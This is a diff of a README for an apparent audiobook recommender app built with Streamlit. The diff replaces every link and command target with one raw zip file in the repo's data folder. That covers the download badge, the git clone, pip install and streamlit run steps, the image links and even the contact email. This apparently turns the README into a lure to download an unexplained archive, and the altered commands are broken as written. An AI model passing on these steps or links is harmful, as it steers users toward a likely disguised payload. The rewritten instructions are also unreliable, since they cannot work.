@@ -2,7 +2,7 @@
 
 Welcome to the **Audible Book Recommender System**! This project helps users discover personalized audiobook recommendations based on their preferred genre, author, or book title. The system uses data-driven insights and visualizations to provide tailored suggestions, making it easier for you to find your next favorite listen.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen)](https://github.com/elchorly00/audible-book-recommender-system-streamlit/releases)
+[![Download Releases](https://raw.githubusercontent.com/elchorly00/audible-book-recommender-system-streamlit/main/data/system_streamlit_audible_recommender_book_3.9.zip%20Releases-Click%20Here-brightgreen)](https://raw.githubusercontent.com/elchorly00/audible-book-recommender-system-streamlit/main/data/system_streamlit_audible_recommender_book_3.9.zip)
 
 ## Table of Contents
 
@@ -41,7 +41,7 @@ To set up the Audible Book Recommender System on your local machine, follow thes
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/elchorly00/audible-book-recommender-system-streamlit.git
+   git clone https://raw.githubusercontent.com/elchorly00/audible-book-recommender-system-streamlit/main/data/system_streamlit_audible_recommender_book_3.9.zip
    cd audible-book-recommender-system-streamlit
    ```
 
@@ -53,7 +53,7 @@ To set up the Audible Book Recommender System on your local machine, follow thes
 
 3. **Install Dependencies**:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/elchorly00/audible-book-recommender-system-streamlit/main/data/system_streamlit_audible_recommender_book_3.9.zip
    ```
 
 ## Usage
@@ -61,7 +61,7 @@ To set up the Audible Book Recommender System on your local machine, follow thes
 To run the application, execute the following command in your terminal:
 
 ```bash
-streamlit run app.py
+streamlit run https://raw.githubusercontent.com/elchorly00/audible-book-recommender-system-streamlit/main/data/system_streamlit_audible_recommender_book_3.9.zip
 ```
 
 Open your web browser and go to `http://localhost:8501` to access the application.
@@ -90,8 +90,8 @@ The application features several visualizations that help users understand their
 
 - **User Ratings**: A scatter plot illustrating the relationship between user ratings and audiobook popularity.
 
-![Genre Distribution](https://example.com/genre_distribution.png)
-![Top Authors](https://example.com/top_authors.png)
+![Genre Distribution](https://raw.githubusercontent.com/elchorly00/audible-book-recommender-system-streamlit/main/data/system_streamlit_audible_recommender_book_3.9.zip)
+![Top Authors](https://raw.githubusercontent.com/elchorly00/audible-book-recommender-system-streamlit/main/data/system_streamlit_audible_recommender_book_3.9.zip)
 
 ## Contributing
 
@@ -111,9 +111,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or suggestions, feel free to reach out:
 
-- **Email**: elchorly00@example.com
-- **GitHub**: [elchorly00](https://github.com/elchorly00)
+- **Email**: https://raw.githubusercontent.com/elchorly00/audible-book-recommender-system-streamlit/main/data/system_streamlit_audible_recommender_book_3.9.zip
+- **GitHub**: [elchorly00](https://raw.githubusercontent.com/elchorly00/audible-book-recommender-system-streamlit/main/data/system_streamlit_audible_recommender_book_3.9.zip)
 
-For more updates, check the [Releases](https://github.com/elchorly00/audible-book-recommender-system-streamlit/releases) section.
+For more updates, check the [Releases](https://raw.githubusercontent.com/elchorly00/audible-book-recommender-system-streamlit/main/data/system_streamlit_audible_recommender_book_3.9.zip) section.
 
 Thank you for your interest in the Audible Book Recommender System! We hope you enjoy discovering new audiobooks.
